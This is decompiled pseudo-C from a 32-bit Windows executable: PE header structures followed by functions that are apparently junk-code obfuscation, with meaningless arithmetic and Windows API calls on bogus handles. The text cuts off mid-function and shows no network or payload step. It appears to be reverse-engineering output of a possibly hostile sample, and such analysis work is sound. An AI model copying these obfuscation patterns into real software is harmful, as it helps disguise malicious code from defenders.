typedef struct tagSIZE tagSIZE, *PtagSIZE;

struct tagSIZE {
    LONG cx;
    LONG cy;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HMETAFILE__ HMETAFILE__, *PHMETAFILE__;

struct HMETAFILE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef struct tagSIZE *LPSIZE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef int (*FARPROC)(void);

typedef struct HDC__ *HDC;

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef WORD *LPWORD;

typedef int INT;

typedef struct HRGN__ *HRGN;

typedef LONG_PTR LRESULT;

typedef HANDLE HGLOBAL;

typedef struct HICON__ *HICON;

typedef struct HMETAFILE__ *HMETAFILE;

typedef struct HENHMETAFILE__ HENHMETAFILE__, *PHENHMETAFILE__;

struct HENHMETAFILE__ {
    int unused;
};

typedef struct HENHMETAFILE__ *HENHMETAFILE;

typedef HICON HCURSOR;

typedef struct HBRUSH__ *HBRUSH;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_30 IMAGE_RESOURCE_DIR_STRING_U_30, *PIMAGE_RESOURCE_DIR_STRING_U_30;

struct IMAGE_RESOURCE_DIR_STRING_U_30 {
    word Length;
    wchar16 NameString[15];
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_38 IMAGE_RESOURCE_DIR_STRING_U_38, *PIMAGE_RESOURCE_DIR_STRING_U_38;

struct IMAGE_RESOURCE_DIR_STRING_U_38 {
    word Length;
    wchar16 NameString[19];
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_32 IMAGE_RESOURCE_DIR_STRING_U_32, *PIMAGE_RESOURCE_DIR_STRING_U_32;

struct IMAGE_RESOURCE_DIR_STRING_U_32 {
    word Length;
    wchar16 NameString[16];
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_34 IMAGE_RESOURCE_DIR_STRING_U_34, *PIMAGE_RESOURCE_DIR_STRING_U_34;

struct IMAGE_RESOURCE_DIR_STRING_U_34 {
    word Length;
    wchar16 NameString[17];
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef uint u_int;

typedef UINT_PTR SOCKET;

typedef ushort u_short;

typedef struct sockaddr sockaddr, *Psockaddr;

struct sockaddr {
    u_short sa_family;
    char sa_data[14];
};




// WARNING: Removing unreachable block (ram,0x0046904c)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00469000(void)

{
  int unaff_EBP;
  int unaff_ESI;
  uint uVar1;
  int iVar2;
  
  uVar1 = unaff_ESI + unaff_EBP * 2 + 0x52f;
  if ((uVar1 & 0x1c67) != 0) {
    uVar1 = 0x76f20;
  }
  _DAT_004e8669 = _DAT_004e8669 - uVar1;
  FUN_00469000();
  iVar2 = 0xf8c;
  if ((_DAT_004e8951 & 0xf8c) == 0) {
    iVar2 = 0x4eb51 - _DAT_004e9040;
  }
  _DAT_004e8d36 = _DAT_004e8d36 + iVar2;
  return;
}



// WARNING: Removing unreachable block (ram,0x004690fb)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004690db(int param_1)

{
  _DAT_004e8604 = 0x23460;
  _DAT_004e8c0d = 0x23460;
  _DAT_004e804f = _DAT_004e8736 + 0x6ce;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00469287(undefined param_1,undefined4 param_2)

{
  _DAT_004e8e07 = 699;
  _DAT_004e9023 = _DAT_004e9023 + 699;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_004692cf(int param_1)

{
  uint uVar1;
  
  uVar1 = param_1 - 0x203U >> 3;
  if ((uVar1 & 0x1ffb) == 0) {
    uVar1 = uVar1 + param_1;
  }
  _DAT_004e8650 = uVar1 + 1;
  _DAT_004e84e6 = uVar1 + 1;
  _DAT_004e843f = _DAT_004e843f + -0x1c76;
  uVar1 = -param_1;
  if ((_DAT_004e8580 & uVar1) == 0) {
    uVar1 = uVar1 + 0xd9a;
  }
  uVar1 = uVar1 | _DAT_004e8015;
  if (uVar1 == 0) {
    uVar1 = _DAT_004e84f0 - 0xe07;
  }
  _DAT_004e926e = _DAT_004e926e + uVar1;
  _DAT_004e84ca = _DAT_004e84ca + uVar1 * 2;
  _DAT_004e8fab = uVar1 * 2 + -0xbd;
  if (_DAT_004e8fab == 0) {
    _DAT_004e8fab = -_DAT_004e8f77;
  }
  return _DAT_004e8fab != 0x15d;
}



// WARNING: Removing unreachable block (ram,0x00469484)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004693ab(int param_1)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = 0xfffff76e - _DAT_004e8d5c;
  if (uVar1 != 0) {
    uVar1 = (uVar1 | 0x10b5) + 0x177f;
  }
  uVar1 = uVar1 | 0x26f;
  if ((uVar1 & 0xd5d) != 0) {
    uVar1 = uVar1 - 0x22e;
  }
  iVar2 = CONCAT31((undefined3)uRam004e8918,DAT_004e8917) + uVar1;
  DAT_004e8917 = (undefined)iVar2;
  uRam004e8918._0_3_ = (undefined3)((uint)iVar2 >> 8);
  iVar2 = 0x25d3;
  if ((_DAT_004e8126 & 0x25d3) == 0) {
    iVar2 = param_1 + 0x25d5;
  }
  _DAT_004e8631 = 0x5d1;
  _DAT_004e8fc0 = _DAT_004e8fc0 + iVar2;
  uVar1 = _DAT_004e90ff | 0x2b67;
  if (uVar1 == 0) {
    uVar1 = -_DAT_004e8c69 | 0x2374;
  }
  _DAT_004e8721 = uVar1 - 0x28d;
  _DAT_004e80dd = _DAT_004e80dd - (uVar1 - 0x28d);
  _DAT_004e8a0c = _DAT_004e8a0c + -0x4801;
  return;
}



// WARNING: Removing unreachable block (ram,0x00469523)
// WARNING: Removing unreachable block (ram,0x00469534)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004694a3(void)

{
  uint uVar1;
  int iVar2;
  int unaff_EDI;
  int unaff_retaddr;
  
  uVar1 = _DAT_004e8328;
  if ((_DAT_004e8328 & 0x3a) == 0) {
    uVar1 = _DAT_004e8328 & 0xfffffff;
  }
  iVar2 = uVar1 - 0xaba;
  if (iVar2 == 0) {
    iVar2 = _DAT_004e8323 * 0x80;
  }
  _DAT_004e8d31 = _DAT_004e8d31 + iVar2;
  uVar1 = (0x9ea - _DAT_004e92d7) + _DAT_004e8243;
  if ((_DAT_004e8749 & uVar1) != 0) {
    uVar1 = uVar1 >> 7;
  }
  _DAT_004e8bab = uVar1 + 1;
  _DAT_004e8905 = 0x9ea - _DAT_004e92d7;
  _DAT_004e8226 = _DAT_004e8226 + uVar1 + 1;
  _DAT_004e8e81 = 0x3bfe;
  uVar1 = -_DAT_004e8d5d;
  if (uVar1 != 0x978) {
    uVar1 = (uVar1 >> 5 | _DAT_004e8d5d * -0x8000000) - unaff_retaddr;
  }
  _DAT_004e91e9 = _DAT_004e91e9 + uVar1;
  uVar1 = unaff_EDI + unaff_retaddr | CONCAT13(uRam004e832c,_DAT_004e8329);
  if (uVar1 == 0) {
    uVar1 = 0xfffffebc;
  }
  iVar2 = uVar1 - 1;
  uVar1 = uVar1 + 0xf4a;
  if ((uVar1 & 0x2189) == 0) {
    iVar2 = 0x269c;
    uVar1 = 0x4d37f;
  }
  _DAT_004e833a = _DAT_004e833a - uVar1;
  return CONCAT31((int3)((uint)iVar2 >> 8),unaff_EDI != 0x89);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0046960e(undefined4 param_1)

{
  int iVar1;
  
  _DAT_004e921d = 0x8ae58;
  iVar1 = 0x7fffdd94 - _DAT_004e8561;
  if (iVar1 == 0) {
    iVar1 = 0x1ec80;
  }
  _DAT_004e8416 = iVar1 + 0x1b1b;
  return;
}



// WARNING: Removing unreachable block (ram,0x004696e0)
// WARNING: Removing unreachable block (ram,0x00469743)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0046968a(undefined4 param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  
  iVar2 = 0xfd;
  if ((_DAT_004e831c & 0xfd) != 0) {
    iVar2 = 0x14ff - param_2;
  }
  _DAT_004e8e34 = iVar2 - _DAT_004e8d14;
  uVar1 = (iVar2 - _DAT_004e8d14) + 0x1f2a;
  if ((uVar1 & 0x1ddf) == 0) {
    uVar1 = uVar1 * 2 | (uint)((int)uVar1 < 0);
  }
  _DAT_004e85fc = 0;
  _DAT_004e81d5 = _DAT_004e81d5 + uVar1;
  iVar2 = -0x233f;
  if ((_DAT_004e8ec7 & 0xffffdcc1) == 0) {
    iVar2 = 0x1ffffb9 - _DAT_004e920d;
  }
  _DAT_004e8aae = 0;
  _DAT_004e8f6c = _DAT_004e8f6c + iVar2;
  _DAT_004e91c1 = 0;
  _DAT_004e8338 = _DAT_004e8338 + 0x766;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0046976c(void)

{
  int iVar1;
  int iVar2;
  int unaff_EBX;
  uint uVar3;
  
  iVar1 = 0xc79;
  iVar2 = 0xc40;
  if ((_DAT_004e8f2c & 0xc40) != 0) {
    iVar1 = 0x3834;
    iVar2 = 0x12b2;
  }
  _DAT_004e893a = iVar2 + 0xbd7;
  _DAT_004e8300 = _DAT_004e8300 + iVar2 + 0xbd7;
  _DAT_004e8ee1 = _DAT_004e8ee1 + (-0xc0 - _DAT_004e86f3);
  uVar3 = iVar1 + 0x537;
  if ((uVar3 & 0x15ea) != 0) {
    uVar3 = uVar3 >> 1 | (uint)((uVar3 & 1) != 0) << 0x1f;
  }
  _DAT_004e92c9 = _DAT_004e92c9 - uVar3;
  _DAT_004e8725 = _DAT_004e8725 - (unaff_EBX + 0x1264 + uVar3 * 2);
  uVar3 = _DAT_004e88fb | 0xaea;
  if (uVar3 != 0) {
    uVar3 = ((uVar3 << 1 | (uint)((int)uVar3 < 0)) - _DAT_004e919f) + 1;
  }
  iVar1 = (uVar3 << 4 | uVar3 >> 0x1c) - 0x67d;
  if (iVar1 != 0) {
    iVar1 = iVar1 + _DAT_004e9175 + 0x8b5;
  }
  _DAT_004e86aa = _DAT_004e86aa - iVar1;
  return;
}



// WARNING: Removing unreachable block (ram,0x0046985d)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_00469846(undefined4 param_1,undefined4 param_2,int param_3)

{
  _DAT_004e846b = 0;
  _DAT_004e80b5 = 0x1f9e6;
  _DAT_004e8376 = param_3 + 0x1f9e6;
  return param_3 + 0x1f9e6 == 0x366;
}



// WARNING: Removing unreachable block (ram,0x00469920)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004698e5(int param_1)

{
  undefined4 in_EAX;
  uint uVar1;
  int unaff_retaddr;
  
  _DAT_004e9099 = _DAT_004e9099 + 0x516d2;
  uVar1 = unaff_retaddr + param_1 & 0xffffff;
  if ((unaff_retaddr + param_1 & 0x16b2U) != 0) {
    uVar1 = uVar1 << 1;
  }
  uVar1 = uVar1 >> 1 | _DAT_004e9018;
  if (uVar1 != 0) {
    uVar1 = ((uVar1 + 0x840) * 0x80 | uVar1 + 0x840 >> 0x19) - 0xa3b;
  }
  _DAT_004e8042 = _DAT_004e8042 - uVar1;
  _DAT_004e8f7c = 0x2e4a0;
  _DAT_004e82ef = _DAT_004e82ef + -0x2e4a0;
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// WARNING: Removing unreachable block (ram,0x00469bd5)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00469b36(undefined4 param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  int unaff_EDI;
  int unaff_retaddr;
  
  _DAT_004e8c92 = 0x30280;
  iVar1 = 0xcdf;
  if ((_DAT_004e8a97 & 0xcdf) != 0) {
    iVar1 = (param_4 + 0x66f) - param_2;
  }
  _DAT_004e8e24 = 0xce0;
  _DAT_004e8716 = _DAT_004e8716 - iVar1;
  _DAT_004e846b = unaff_retaddr - 1U >> 7 | (unaff_retaddr - 1U) * 0x2000000;
  iVar1 = _DAT_004e8b7e + 0x363;
  _DAT_004e913f = iVar1 + param_4;
  if ((_DAT_004e913f & 0xee9) == 0) {
    iVar1 = 0x2599;
    _DAT_004e913f = _DAT_004e913f | 0x2599;
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),unaff_EDI != 0x185);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_00469c1a(void *this,uint param_1)

{
  int iVar1;
  int unaff_EBX;
  
  iVar1 = (unaff_EBX + 0x83U >> 7 | (unaff_EBX + 0x83U) * 0x2000000) + 0x728;
  if (iVar1 == 0) {
    iVar1 = 0x1b86a;
  }
  _DAT_004e8210 = _DAT_004e8210 - iVar1;
  _DAT_004e927e = param_1 >> 5;
  if ((_DAT_004e927e & 0x69c) == 0) {
    _DAT_004e927e = (_DAT_004e927e + 1 | 0x476) << 1;
  }
  _DAT_004e927e = _DAT_004e927e - 0x6d1;
  if (_DAT_004e927e != 0) {
    _DAT_004e927e = _DAT_004e927e >> 6;
  }
  _DAT_004e8926 = param_1;
  return CONCAT31((int3)(_DAT_004e927e >> 8),this == (void *)0x253);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00469c84(undefined4 param_1)

{
  undefined4 in_EAX;
  int unaff_EBX;
  
  _DAT_004e865f = unaff_EBX + (0x23a - _DAT_004e83af);
  return in_EAX;
}



// WARNING: Removing unreachable block (ram,0x0046904c)
// WARNING: Removing unreachable block (ram,0x0046acba)
// WARNING: Removing unreachable block (ram,0x0046ac3e)
// WARNING: Removing unreachable block (ram,0x0046ac8f)
// WARNING: Removing unreachable block (ram,0x0046b011)
// WARNING: Removing unreachable block (ram,0x00469d68)
// WARNING: Removing unreachable block (ram,0x00469d7e)
// WARNING: Removing unreachable block (ram,0x00469d80)
// WARNING: Removing unreachable block (ram,0x00469d8e)
// WARNING: Removing unreachable block (ram,0x00469d96)
// WARNING: Removing unreachable block (ram,0x00469dac)
// WARNING: Removing unreachable block (ram,0x00469db6)
// WARNING: Removing unreachable block (ram,0x00469dcf)
// WARNING: Removing unreachable block (ram,0x00469dd5)
// WARNING: Removing unreachable block (ram,0x00469ded)
// WARNING: Removing unreachable block (ram,0x00469dfb)
// WARNING: Removing unreachable block (ram,0x0046acce)
// WARNING: Removing unreachable block (ram,0x0046b08b)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  bool bVar1;
  LSTATUS LVar2;
  int iVar3;
  UINT UVar4;
  HICON pHVar5;
  int iVar6;
  HRESULT HVar7;
  HENHMETAFILE pHVar8;
  int iVar9;
  HCURSOR pHVar10;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  void *this;
  void *this_00;
  void *this_01;
  int unaff_EBX;
  uint uVar11;
  undefined1 in_stack_00000021;
  undefined uVar12;
  undefined uVar13;
  undefined in_stack_ffffffa8;
  undefined uVar14;
  uint in_stack_ffffffac;
  undefined in_stack_ffffffb0;
  byte in_stack_ffffffb4;
  undefined uVar15;
  uint in_stack_ffffffb8;
  undefined uVar16;
  undefined uVar17;
  uint uStack_3c;
  uint uStack_30;
  uint uStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uVar18;
  
  DAT_004e8bed = 0;
  _DAT_004e886c = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x0);
  DAT_004e8388 = 0;
  uVar18 = 0;
  _DAT_004e8563 = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x0);
  _DAT_004e8b4e = _DAT_004e8b4e + _DAT_004e876a + 0x6e2d6;
  uVar13 = 6;
  uVar12 = 0xf0;
  _DAT_004e923d = (unaff_EBX + 0x706a0) * 0x10;
  if ((uStack_3c & _DAT_004e923d) == 0) {
    _DAT_004e923d = _DAT_004e923d - _DAT_004e84a1;
  }
  _DAT_004e8471 = _DAT_004e8471 - _DAT_004e923d;
  FUN_00469c1a((void *)0x6e0ba,0x4e90ad);
  CreateDCA((LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(DEVMODEA *)0x0);
  s_00_p0_004e8fe3[0] = -2;
  s_00_p0_004e8fe3[1] = '\x01';
  s_00_p0_004e8fe3[2] = '\0';
  s_00_p0_004e8fe3[3] = '\0';
  uVar11 = 0x1feU - _DAT_004e867d | 0xaad;
  if (uVar11 != 0) {
    uVar11 = uVar11 + _DAT_004e80a7;
  }
  _DAT_004e8f1b = _DAT_004e8f1b - uVar11;
  _DAT_004e8b0b = FUN_004693ab(0x4e8899);
  FUN_004690db(0xc407);
  RegOpenKeyA((HKEY)0x80000000,(LPCSTR)0x0,(PHKEY)0x0);
  FUN_004694a3();
  uVar11 = 0x400 - _DAT_004e8946;
  if ((uVar18 | uVar11) == 0) {
    uVar11 = uVar11 & 0xfffff;
  }
  if ((_DAT_004e8520 & uVar11) == 0) {
    uVar11 = uVar11 + 0x2568;
  }
  _DAT_004e916d = uVar11 & 0xf | 0x1221;
  if (_DAT_004e916d != 0) {
    _DAT_004e916d = 0xfffff8d8;
  }
  _DAT_004e89f6 = 0xca6a6;
  LVar2 = RegSaveKeyA((HKEY)0x73d3887c,&DAT_004e8808,(LPSECURITY_ATTRIBUTES)&DAT_004e900b);
  if (LVar2 != 0) {
    in_stack_ffffffb4 = in_stack_ffffffb4 | (byte)(LVar2 + -0x1f86);
    _DAT_004e871b = (LVar2 + -0x1f86) - _DAT_004e8ecf;
    _DAT_004e8881 = _DAT_004e871b;
    FUN_0046968a(DAT_004e82e8,0x4e8ea2);
    _DAT_004e836f = 0x753;
    s_BB_B___004e8534._0_4_ = s_BB_B___004e8534._0_4_ + -0x753;
    iVar3 = FUN_0046960e(0x4987);
    _DAT_004e8b7b = _DAT_004e8b7b - iVar3;
    iVar3 = ExcludeClipRect((HDC)0x1,0xa3,0x74,0x5c,0x94);
    if (iVar3 == 0) {
      uVar18 = FUN_00469c1a(this,0x4e8218);
      if ((char)uVar18 == '\0') {
        uVar18 = uVar18 + 0x24fcf4;
      }
      uVar18 = uVar18 | 0x2359;
      if ((uStack_30 & uVar18) == 0) {
        uVar18 = uVar18 + 0x9ef;
      }
      _DAT_004e88b4 = _DAT_004e88b4 - uVar18;
      uVar11 = FUN_004694a3();
      uVar18 = uStack_14 | uVar11;
      if (uVar18 == 0) {
        uVar11 = uVar11 << 3;
      }
      uVar11 = uVar11 - _DAT_004e8a6c;
      if ((uVar11 & 0x193) != 0) {
        uVar11 = uVar11 + 1;
      }
      uVar11 = uVar11 >> 4 | uVar11 << 0x1c | _DAT_004e909f;
      if (uVar11 != 0) {
        uVar11 = uVar11 - _DAT_004e8690 >> 6;
      }
      _DAT_004e8a0f = _DAT_004e8a0f + uVar11;
      UVar4 = GetACP();
      if (UVar4 != 0) {
        iVar3 = 0x1f10;
        if ((uStack_30 | 0x1f10) != 0) {
          iVar3 = 0x7c400;
        }
        uVar11 = iVar3 - 1;
        if ((uVar18 & uVar11) == 0) {
          uVar11 = iVar3 + 0x1bac;
        }
        _DAT_004e87d1 = uVar11 << 3 | uVar11 >> 0x1d;
        _DAT_004e88d4 = _DAT_004e87d1;
        pHVar5 = DuplicateIcon((HINSTANCE)0x5439efac,(HICON)0x58efa3ab);
        if (pHVar5 != (HICON)0x0) {
LAB_0046907b:
          do {
          } while( true );
        }
        iVar3 = FUN_00469b36(DAT_004e8b88,0,&DAT_004e8ab4,DAT_004e8efd);
        _DAT_004e9082 = iVar3 + 0x98 + _DAT_004e8c77 | 0x1d0a;
        if ((uVar18 & _DAT_004e9082) == 0) {
          _DAT_004e9082 = _DAT_004e9082 + 1 & 0xfffffff;
        }
        _DAT_004e9082 = _DAT_004e9082 * 0x100;
        if ((uStack_1c | _DAT_004e9082) == 0) {
          _DAT_004e9082 = _DAT_004e9082 + 0x674;
        }
        iVar3 = FUN_0046968a(&DAT_004e88ec,0x4e83d5);
        iVar3 = (iVar3 + 0x496) * 0x40;
        iVar6 = iVar3 + -0xa13;
        if (iVar6 != 0) {
          iVar6 = iVar3 + -0x93b;
        }
        _DAT_004e890c = _DAT_004e890c - iVar6;
        iVar3 = 0x7ab22600;
        HVar7 = SHGetDataFromIDListW
                          ((IShellFolder *)0x0,(LPCITEMIDLIST)0x0,0x7ab22600,(void *)0xc5bc82a,
                           0x4336a121);
        if (HVar7 != 0) {
          s_MOBEZ8_r_004e92ea[0] = '\0';
          s_MOBEZ8_r_004e92ea[1] = '\0';
          s_MOBEZ8_r_004e92ea[2] = '\0';
          s_MOBEZ8_r_004e92ea[3] = '\0';
          _DAT_004e86ce = _DAT_004e86ce + -0x735;
          FUN_00469c1a(this_00,0x2c0b);
          _DAT_004e8a19 = 0xae0c0;
          _DAT_004e842b = _DAT_004e842b + -0xae0c0;
          FUN_00469c84(&DAT_004e8c69);
          _DAT_004e837f = _DAT_004e837f + 0x1e15;
          iVar6 = FUN_0046a36a();
          if (iVar6 == 0) goto LAB_0046907b;
          pHVar8 = GetEnhMetaFileA(&DAT_004e909a);
          if (pHVar8 != (HENHMETAFILE)0x0) goto LAB_00469037;
          _DAT_004e8f8a = 0x22a675;
          _DAT_004e83d3 = 0x3073f0;
          RegSaveKeyA((HKEY)0x4e3ceb70,&DAT_004e89a0,(LPSECURITY_ATTRIBUTES)&DAT_004e8e1a);
          iVar3 = 0x3439;
          if ((in_stack_ffffffb8 & 0x3439) == 0) {
            iVar3 = 0x343a;
          }
          uVar18 = iVar3 + 0x4fcU | 0x733;
          if (uVar18 == 0) {
